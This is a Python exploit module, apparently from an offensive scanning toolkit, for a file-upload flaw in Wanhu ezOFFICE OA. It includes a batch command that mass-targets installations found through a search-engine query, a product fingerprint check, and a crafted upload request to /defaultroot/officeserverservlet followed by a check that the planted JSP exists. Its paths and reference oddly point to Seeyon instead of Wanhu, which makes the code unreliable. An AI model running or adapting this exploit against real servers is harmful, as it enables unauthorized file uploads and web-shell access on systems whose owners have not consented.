# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-21 14:52


from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# python3 batch.py -m exploit.scripts.OA.Wanhu.htmlofficeservlet_getshell -cs -fs "app=\"万户网络-ezOFFICE\" && country=\"CN\""

class Script(BaseScript):
    name = 'Wanhu'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源，关于文件名的定义算法
        self.bug_refer = 'https://github.com/MRLEE123456/record/blob/451e82b88e248bff5585b21e6c2aa78d5c92be4a/%E5%B7%A5%E5%85%B7/exp/%E4%B8%AD%E9%97%B4%E4%BB%B6/seeyon/%E8%87%B4%E8%BF%9COA%20RCE/README.md'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/defaultroot/officeserverservlet']
        # priority
        self.priority = 1
        # 相关信息
        self.info = '''/defaultroot/officeserverservlet 路径存在文件上传漏洞'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'var whirRootPath = ' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            data = '''DBSTEP V3.0     355             0               22             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdn1dhwUw3zLe5nHzs\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee'''
            for execPath in self.exec_path_list:
                url = f'http://{self.target}{execPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with session.post(url=url, headers=self.headers, data=data, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        url1 = f'http://{self.target}/seeyon/hg123456.jsp' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/seeyon/hg123456.jsp'
                        async with session.get(url=url1, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response2:
                            if response2 is not None and response2.status == 200:
                                text2 = await response2.text()
                                if 'test for me' in text2:
                                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                                    return {'name': '{} htmlofficeservlet getshell'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
